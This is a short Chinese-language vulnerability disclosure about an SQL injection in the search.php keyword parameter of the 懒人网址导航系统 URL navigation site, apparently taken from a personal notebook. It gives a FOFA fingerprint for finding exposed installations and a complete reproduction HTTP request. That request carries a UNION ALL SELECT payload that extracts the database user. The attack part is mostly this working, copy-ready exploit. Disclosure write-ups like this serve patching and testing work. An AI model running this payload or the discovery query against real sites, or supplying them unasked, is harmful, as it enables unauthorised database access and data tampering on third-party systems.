# 懒人网址导航系统search存在SQL注入漏洞

# 一、漏洞简介
懒人网址导航系统是一种智能化的网址导航平台，旨在帮助用户快速找到所需的网址和资源。该系统提供了以下功能和特点：该系统提供了智能化的网址搜索和推荐功能，能够根据用户的搜索习惯和偏好推荐相关的网址和资源。同时，系统还提供了网址分类、网址收藏和网址分享等功能，方便用户管理和共享网址。懒人网址导航系统存在SQL search接口处存在注入漏洞，恶意攻击者可能会利用此漏洞修改数据库中的数据，例如添加、删除或修改记录，导致数据损坏或丢失。 

# 二、影响版本
+ 懒人网址导航系统

# 三、资产测绘
+ fofa`"./templates/antidote/css/style.css`

![1716364321581-c970a718-1a58-4d66-a24d-bbd5fb071411.png](./img/rmkV4XQtbb9HiW41/1716364321581-c970a718-1a58-4d66-a24d-bbd5fb071411-052360.png)

# 四、漏洞复现
```plain
GET /search.php?keyword=' UNION ALL SELECT CONCAT(IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Bypass HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close
```

![1716364584387-8647dcda-d556-49e4-ac66-a177fda54135.png](./img/rmkV4XQtbb9HiW41/1716364584387-8647dcda-d556-49e4-ac66-a177fda54135-837041.png)



> 更新: 2024-05-23 13:30:31  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/nugh9v1qorh6l3wt>